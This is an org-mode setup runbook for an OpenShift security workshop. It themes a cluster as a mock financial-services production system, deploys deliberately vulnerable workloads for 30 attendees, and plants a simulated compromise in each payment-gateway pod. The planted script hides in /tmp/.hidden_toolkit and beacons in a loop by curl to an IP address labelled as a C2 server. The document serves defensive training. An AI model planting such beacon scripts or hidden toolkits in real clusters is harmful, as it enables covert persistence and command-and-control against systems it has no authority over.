#+TITLE: Openshift security workshop
#+DATE: <2026-05-11 Mon>
#+AUTHOR: James Blair


This document captures the steps required to set up an instance of the workshop.


* Log in to cluster

Let's start by logging in as the cluster admin.

#+NAME: Login to openshift cluster
#+begin_src bash
source .env
oc login "${OCP_API_URL}" --username "${OCP_USERNAME}" --password "${OCP_PASSWORD}" --insecure-skip-tls-verify
#+end_src

#+RESULTS: Login to openshift cluster
#+begin_example
WARNING: Using insecure TLS client config. Setting this option is not supported!

Login successful.

You have access to 77 projects, the list has been suppressed. You can list all projects with 'oc projects'

Using project "default".
#+end_example


* Cluster theming

To set up for this workshop and help build the style we're going to make some visual customisations to the OpenShift cluster to make it feel more like a customer production cluster.


** Update cluster logo

#+NAME: Update cluster logo
#+begin_src bash
oc create configmap console-custom-logo --from-file=/home/${USER}/Documents/workshops/public/static/images/fsi-security/logo.png --namespace openshift-config

cat << EOF | oc apply --filename -
apiVersion: operator.openshift.io/v1
kind: Console
metadata:
  name: cluster
spec:
  customization:
    customLogoFile:
      key: logo.png
      name: console-custom-logo
    customProductName: ACME Financial Services OpenShift Console
  perspectives:
    - id: admin
      visibility:
        state: Enabled
    - id: dev
      visibility:
        state: Disabled
EOF
#+end_src

#+RESULTS: Update cluster logo
#+begin_example
console.operator.openshift.io/cluster configured
#+end_example


** Add an interesting notification banner

#+NAME: Create console banner
#+begin_src bash
cat << EOF | oc apply --filename -
apiVersion: console.openshift.io/v1
kind: ConsoleNotification
metadata:
  name: acme-banner
spec:
  text: ACME Financial Services Production OpenShift
  location: BannerTop
  color: 'darkblue'
  backgroundColor: '#fff'
EOF
#+end_src

#+RESULTS: Create console banner
#+begin_example
consolenotification.console.openshift.io/acme-banner created
#+end_example


* Create a cluster role for viewing node logs

During the workshop participants are going to query node logs with ~oc adm~.  We need to create a cluster role that will allow this.

#+NAME: Create node log view cluster role
#+begin_src bash
cat << EOF | oc apply --filename -
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: node-log-viewer
rules:
  - apiGroups: [""]
    resources:
      - "nodes/log"
      - "nodes/proxy"
      - "nodes"
    verbs: ["get", "list", "create"]
  - apiGroups: ["config.openshift.io"]
    resources:
      - clusterversions
      - clusteroperators
      - apiservers
    verbs: ["get", "list"]
EOF
#+end_src

#+RESULTS: Create node log view cluster role
#+begin_example
clusterrole.rbac.authorization.k8s.io/node-log-viewer created
#+end_example


* Deploy exercise 4 vulnerable workload

Deploy exercise 4 vulnerable messaging application.

#+NAME: Deploy vulnerable workloads
#+begin_src bash
echo "Applying template for each attendee"
for i in $(seq 1 30); do

  export NAMESPACE=vulnerable-workload-${i}
  envsubst < setup/exercise4/k8s/namespace.yaml | oc apply --filename -
  envsubst < setup/exercise4/k8s/redis.yaml | oc apply --filename -
  envsubst < setup/exercise4/k8s/edge-server.yaml | oc apply --filename -
  envsubst < setup/exercise4/k8s/socketio-server.yaml | oc apply --filename -
  envsubst < setup/exercise4/k8s/edge-server-route.yaml | oc apply --filename -
  envsubst < setup/exercise4/k8s/socketio-server-route.yaml | oc apply --filename -

done
#+end_src

#+RESULTS: Deploy vulnerable workloads
#+begin_example
Applying template for each attendee
namespace/vulnerable-workload-1 created
deployment.apps/message-broker created
service/message-broker created
deployment.apps/edge-server created
service/edge-server created
deployment.apps/socketio-server created
service/socketio-server created
route.route.openshift.io/edge-server created
route.route.openshift.io/socketio-server created
namespace/vulnerable-workload-2 created
deployment.apps/message-broker created
service/message-broker created
deployment.apps/edge-server created
service/edge-server created
deployment.apps/socketio-server created
service/socketio-server created
route.route.openshift.io/edge-server created
route.route.openshift.io/socketio-server created
namespace/vulnerable-workload-3 created
deployment.apps/message-broker created
service/message-broker created
deployment.apps/edge-server created
service/edge-server created
deployment.apps/socketio-server created
service/socketio-server created
route.route.openshift.io/edge-server created
route.route.openshift.io/socketio-server created
namespace/vulnerable-workload-4 created
deployment.apps/message-broker created
service/message-broker created
deployment.apps/edge-server created
service/edge-server created
deployment.apps/socketio-server created
service/socketio-server created
route.route.openshift.io/edge-server created
route.route.openshift.io/socketio-server created
namespace/vulnerable-workload-5 created
deployment.apps/message-broker created
service/message-broker created
deployment.apps/edge-server created
service/edge-server created
deployment.apps/socketio-server created
service/socketio-server created
route.route.openshift.io/edge-server created
route.route.openshift.io/socketio-server created
namespace/vulnerable-workload-6 created
deployment.apps/message-broker created
service/message-broker created
deployment.apps/edge-server created
service/edge-server created
deployment.apps/socketio-server created
service/socketio-server created
route.route.openshift.io/edge-server created
route.route.openshift.io/socketio-server created
namespace/vulnerable-workload-7 created
deployment.apps/message-broker created
service/message-broker created
deployment.apps/edge-server created
service/edge-server created
deployment.apps/socketio-server created
service/socketio-server created
route.route.openshift.io/edge-server created
route.route.openshift.io/socketio-server created
namespace/vulnerable-workload-8 created
deployment.apps/message-broker created
service/message-broker created
deployment.apps/edge-server created
service/edge-server created
deployment.apps/socketio-server created
service/socketio-server created
route.route.openshift.io/edge-server created
route.route.openshift.io/socketio-server created
namespace/vulnerable-workload-9 created
deployment.apps/message-broker created
service/message-broker created
deployment.apps/edge-server created
service/edge-server created
deployment.apps/socketio-server created
service/socketio-server created
route.route.openshift.io/edge-server created
route.route.openshift.io/socketio-server created
namespace/vulnerable-workload-10 created
deployment.apps/message-broker created
service/message-broker created
deployment.apps/edge-server created
service/edge-server created
deployment.apps/socketio-server created
service/socketio-server created
route.route.openshift.io/edge-server created
route.route.openshift.io/socketio-server created
namespace/vulnerable-workload-11 created
deployment.apps/message-broker created
service/message-broker created
deployment.apps/edge-server created
service/edge-server created
deployment.apps/socketio-server created
service/socketio-server created
route.route.openshift.io/edge-server created
route.route.openshift.io/socketio-server created
namespace/vulnerable-workload-12 created
deployment.apps/message-broker created
service/message-broker created
deployment.apps/edge-server created
service/edge-server created
deployment.apps/socketio-server created
service/socketio-server created
route.route.openshift.io/edge-server created
route.route.openshift.io/socketio-server created
namespace/vulnerable-workload-13 created
deployment.apps/message-broker created
service/message-broker created
deployment.apps/edge-server created
service/edge-server created
deployment.apps/socketio-server created
service/socketio-server created
route.route.openshift.io/edge-server created
route.route.openshift.io/socketio-server created
namespace/vulnerable-workload-14 created
deployment.apps/message-broker created
service/message-broker created
deployment.apps/edge-server created
service/edge-server created
deployment.apps/socketio-server created
service/socketio-server created
route.route.openshift.io/edge-server created
route.route.openshift.io/socketio-server created
namespace/vulnerable-workload-15 created
deployment.apps/message-broker created
service/message-broker created
deployment.apps/edge-server created
service/edge-server created
deployment.apps/socketio-server created
service/socketio-server created
route.route.openshift.io/edge-server created
route.route.openshift.io/socketio-server created
namespace/vulnerable-workload-16 created
deployment.apps/message-broker created
service/message-broker created
deployment.apps/edge-server created
service/edge-server created
deployment.apps/socketio-server created
service/socketio-server created
route.route.openshift.io/edge-server created
route.route.openshift.io/socketio-server created
namespace/vulnerable-workload-17 created
deployment.apps/message-broker created
service/message-broker created
deployment.apps/edge-server created
service/edge-server created
deployment.apps/socketio-server created
service/socketio-server created
route.route.openshift.io/edge-server created
route.route.openshift.io/socketio-server created
namespace/vulnerable-workload-18 created
deployment.apps/message-broker created
service/message-broker created
deployment.apps/edge-server created
service/edge-server created
deployment.apps/socketio-server created
service/socketio-server created
route.route.openshift.io/edge-server created
route.route.openshift.io/socketio-server created
namespace/vulnerable-workload-19 created
deployment.apps/message-broker created
service/message-broker created
deployment.apps/edge-server created
service/edge-server created
deployment.apps/socketio-server created
service/socketio-server created
route.route.openshift.io/edge-server created
route.route.openshift.io/socketio-server created
namespace/vulnerable-workload-20 created
deployment.apps/message-broker created
service/message-broker created
deployment.apps/edge-server created
service/edge-server created
deployment.apps/socketio-server created
service/socketio-server created
route.route.openshift.io/edge-server created
route.route.openshift.io/socketio-server created
namespace/vulnerable-workload-21 created
deployment.apps/message-broker created
service/message-broker created
deployment.apps/edge-server created
service/edge-server created
deployment.apps/socketio-server created
service/socketio-server created
route.route.openshift.io/edge-server created
route.route.openshift.io/socketio-server created
namespace/vulnerable-workload-22 created
deployment.apps/message-broker created
service/message-broker created
deployment.apps/edge-server created
service/edge-server created
deployment.apps/socketio-server created
service/socketio-server created
route.route.openshift.io/edge-server created
route.route.openshift.io/socketio-server created
namespace/vulnerable-workload-23 created
deployment.apps/message-broker created
service/message-broker created
deployment.apps/edge-server created
service/edge-server created
deployment.apps/socketio-server created
service/socketio-server created
route.route.openshift.io/edge-server created
route.route.openshift.io/socketio-server created
namespace/vulnerable-workload-24 created
deployment.apps/message-broker created
service/message-broker created
deployment.apps/edge-server created
service/edge-server created
deployment.apps/socketio-server created
service/socketio-server created
route.route.openshift.io/edge-server created
route.route.openshift.io/socketio-server created
namespace/vulnerable-workload-25 created
deployment.apps/message-broker created
service/message-broker created
deployment.apps/edge-server created
service/edge-server created
deployment.apps/socketio-server created
service/socketio-server created
route.route.openshift.io/edge-server created
route.route.openshift.io/socketio-server created
namespace/vulnerable-workload-26 created
deployment.apps/message-broker created
service/message-broker created
deployment.apps/edge-server created
service/edge-server created
deployment.apps/socketio-server created
service/socketio-server created
route.route.openshift.io/edge-server created
route.route.openshift.io/socketio-server created
namespace/vulnerable-workload-27 created
deployment.apps/message-broker created
service/message-broker created
deployment.apps/edge-server created
service/edge-server created
deployment.apps/socketio-server created
service/socketio-server created
route.route.openshift.io/edge-server created
route.route.openshift.io/socketio-server created
namespace/vulnerable-workload-28 created
deployment.apps/message-broker created
service/message-broker created
deployment.apps/edge-server created
service/edge-server created
deployment.apps/socketio-server created
service/socketio-server created
route.route.openshift.io/edge-server created
route.route.openshift.io/socketio-server created
namespace/vulnerable-workload-29 created
deployment.apps/message-broker created
service/message-broker created
deployment.apps/edge-server created
service/edge-server created
deployment.apps/socketio-server created
service/socketio-server created
route.route.openshift.io/edge-server created
route.route.openshift.io/socketio-server created
namespace/vulnerable-workload-30 created
deployment.apps/message-broker created
service/message-broker created
deployment.apps/edge-server created
service/edge-server created
deployment.apps/socketio-server created
service/socketio-server created
route.route.openshift.io/edge-server created
route.route.openshift.io/socketio-server created
#+end_example


* Deploy exercise 2 & 3 compromised workloads

For the purposes of exercise 2 we need an existing project and demo workload for each workshop user.

We'll create the required ~Project~, ~Pod~ and ~ServiceAccount~ by hydrating an OpenShift ~Template~, then carry out the exploit with a bash script once the pods are up.

The ~setup/app-template.yaml~ file also handles the various permissions each workshop attendee requires.

#+NAME: Deploy compromised workloads
#+begin_src bash
echo "Applying template for each attendee"
for i in $(seq 1 30); do

  # Clean up any pre-existing exploited pod
  oc delete pod -l app=payment-gateway --namespace="payment-gateway-${i}" --grace-period=0 --force 2>/dev/null || true
  oc wait --for=delete pod -l app=payment-gateway --namespace="payment-gateway-${i}" --timeout=30s 2>/dev/null || true

  # Hydrate the new pod and supporting resources
  oc process --filename setup/app-template.yaml --param SUFFIX=$i | oc apply --filename -
done

echo "Waiting for all payment-gateway pods to initialize..."
oc wait --for=condition=Ready pods --selector app=payment-gateway --all-namespaces --timeout=90s

echo "Simulating live 'oc exec' intrusion across environments..."
for i in $(seq 1 30); do
  namespace="payment-gateway-$i"

  # Request a short lived token for our new cicd service account in this namespace
  token=$(oc create token cicd-pipeline-runner-sa --namespace "${namespace}")

  # Executing the exploit payload dynamically using explicit parameter names
  oc exec pod/payment-gateway \
    --namespace "${namespace}" \
    --token "${token}" \
    --container httpd \
    -- sh -c '
      export C2_SERVER="185.199.108.153"
      export CODENAME="SHADOW_PIVOT"
      export ENV_MARKER="ACME_SECRET_KEY_EXFIL_TEST_9921"

      mkdir -p /tmp/.hidden_toolkit

      # Build a script that actively beacons out to the C2 server every 10 seconds
      cat << "EOF" > /tmp/.hidden_toolkit/exfil.sh
#!/bin/sh
while true; do
  curl --silent --max-time 2 --output /dev/null \
    --header "X-Agent-ID: SHADOW_PIVOT" \
    --header "X-Target-Namespace: payment-gateway" \
    "http://185.199.108.153/api/v1/beacon"

  sleep 30
done
EOF

      chmod +x /tmp/.hidden_toolkit/exfil.sh
      /tmp/.hidden_toolkit/exfil.sh > /dev/null 2>&1 &
    '
  echo "[+] Namespace ${namespace} weaponized via simulated session execution."
done
#+end_src

#+RESULTS: Deploy compromised workloads
#+begin_example
Applying template for each attendee
No resources found
project.project.openshift.io/payment-gateway-1 created
pod/payment-gateway created
serviceaccount/cicd-pipeline-runner-sa created
rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
role.rbac.authorization.k8s.io/container-executor created
rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-1 created
clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-1 created
rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
No resources found
project.project.openshift.io/payment-gateway-2 created
pod/payment-gateway created
serviceaccount/cicd-pipeline-runner-sa created
rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
role.rbac.authorization.k8s.io/container-executor created
rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-2 created
clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-2 created
rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
No resources found
project.project.openshift.io/payment-gateway-3 created
pod/payment-gateway created
serviceaccount/cicd-pipeline-runner-sa created
rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
role.rbac.authorization.k8s.io/container-executor created
rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-3 created
clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-3 created
rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
No resources found
project.project.openshift.io/payment-gateway-4 created
pod/payment-gateway created
serviceaccount/cicd-pipeline-runner-sa created
rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
role.rbac.authorization.k8s.io/container-executor created
rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-4 created
clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-4 created
rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
No resources found
project.project.openshift.io/payment-gateway-5 created
pod/payment-gateway created
serviceaccount/cicd-pipeline-runner-sa created
rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
role.rbac.authorization.k8s.io/container-executor created
rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-5 created
clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-5 created
rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
No resources found
project.project.openshift.io/payment-gateway-6 created
pod/payment-gateway created
serviceaccount/cicd-pipeline-runner-sa created
rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
role.rbac.authorization.k8s.io/container-executor created
rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-6 created
clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-6 created
rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
No resources found
project.project.openshift.io/payment-gateway-7 created
pod/payment-gateway created
serviceaccount/cicd-pipeline-runner-sa created
rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
role.rbac.authorization.k8s.io/container-executor created
rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-7 created
clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-7 created
rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
No resources found
project.project.openshift.io/payment-gateway-8 created
pod/payment-gateway created
serviceaccount/cicd-pipeline-runner-sa created
rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
role.rbac.authorization.k8s.io/container-executor created
rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-8 created
clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-8 created
rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
No resources found
project.project.openshift.io/payment-gateway-9 created
pod/payment-gateway created
serviceaccount/cicd-pipeline-runner-sa created
rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
role.rbac.authorization.k8s.io/container-executor created
rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-9 created
clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-9 created
rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
No resources found
project.project.openshift.io/payment-gateway-10 created
pod/payment-gateway created
serviceaccount/cicd-pipeline-runner-sa created
rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
role.rbac.authorization.k8s.io/container-executor created
rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-10 created
clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-10 created
rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
No resources found
project.project.openshift.io/payment-gateway-11 created
pod/payment-gateway created
serviceaccount/cicd-pipeline-runner-sa created
rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
role.rbac.authorization.k8s.io/container-executor created
rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-11 created
clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-11 created
rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
No resources found
project.project.openshift.io/payment-gateway-12 created
pod/payment-gateway created
serviceaccount/cicd-pipeline-runner-sa created
rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
role.rbac.authorization.k8s.io/container-executor created
rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-12 created
clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-12 created
rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
No resources found
project.project.openshift.io/payment-gateway-13 created
pod/payment-gateway created
serviceaccount/cicd-pipeline-runner-sa created
rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
role.rbac.authorization.k8s.io/container-executor created
rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-13 created
clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-13 created
rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
No resources found
project.project.openshift.io/payment-gateway-14 created
pod/payment-gateway created
serviceaccount/cicd-pipeline-runner-sa created
rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
role.rbac.authorization.k8s.io/container-executor created
rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-14 created
clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-14 created
rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
No resources found
project.project.openshift.io/payment-gateway-15 created
pod/payment-gateway created
serviceaccount/cicd-pipeline-runner-sa created
rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
role.rbac.authorization.k8s.io/container-executor created
rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-15 created
clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-15 created
rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
No resources found
project.project.openshift.io/payment-gateway-16 created
pod/payment-gateway created
serviceaccount/cicd-pipeline-runner-sa created
rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
role.rbac.authorization.k8s.io/container-executor created
rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-16 created
clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-16 created
rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
No resources found
project.project.openshift.io/payment-gateway-17 created
pod/payment-gateway created
serviceaccount/cicd-pipeline-runner-sa created
rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
role.rbac.authorization.k8s.io/container-executor created
rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-17 created
clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-17 created
rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
No resources found
project.project.openshift.io/payment-gateway-18 created
pod/payment-gateway created
serviceaccount/cicd-pipeline-runner-sa created
rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
role.rbac.authorization.k8s.io/container-executor created
rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-18 created
clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-18 created
rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
No resources found
project.project.openshift.io/payment-gateway-19 created
pod/payment-gateway created
serviceaccount/cicd-pipeline-runner-sa created
rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
role.rbac.authorization.k8s.io/container-executor created
rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-19 created
clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-19 created
rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
No resources found
project.project.openshift.io/payment-gateway-20 created
pod/payment-gateway created
serviceaccount/cicd-pipeline-runner-sa created
rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
role.rbac.authorization.k8s.io/container-executor created
rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-20 created
clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-20 created
rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
No resources found
project.project.openshift.io/payment-gateway-21 created
pod/payment-gateway created
serviceaccount/cicd-pipeline-runner-sa created
rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
role.rbac.authorization.k8s.io/container-executor created
rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-21 created
clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-21 created
rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
No resources found
project.project.openshift.io/payment-gateway-22 created
pod/payment-gateway created
serviceaccount/cicd-pipeline-runner-sa created
rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
role.rbac.authorization.k8s.io/container-executor created
rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-22 created
clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-22 created
rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
No resources found
project.project.openshift.io/payment-gateway-23 created
pod/payment-gateway created
serviceaccount/cicd-pipeline-runner-sa created
rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
role.rbac.authorization.k8s.io/container-executor created
rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-23 created
clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-23 created
rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
No resources found
project.project.openshift.io/payment-gateway-24 created
pod/payment-gateway created
serviceaccount/cicd-pipeline-runner-sa created
rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
role.rbac.authorization.k8s.io/container-executor created
rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-24 created
clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-24 created
rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
No resources found
project.project.openshift.io/payment-gateway-25 created
pod/payment-gateway created
serviceaccount/cicd-pipeline-runner-sa created
rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
role.rbac.authorization.k8s.io/container-executor created
rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-25 created
clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-25 created
rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
No resources found
project.project.openshift.io/payment-gateway-26 created
pod/payment-gateway created
serviceaccount/cicd-pipeline-runner-sa created
rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
role.rbac.authorization.k8s.io/container-executor created
rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-26 created
clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-26 created
rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
No resources found
project.project.openshift.io/payment-gateway-27 created
pod/payment-gateway created
serviceaccount/cicd-pipeline-runner-sa created
rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
role.rbac.authorization.k8s.io/container-executor created
rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-27 created
clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-27 created
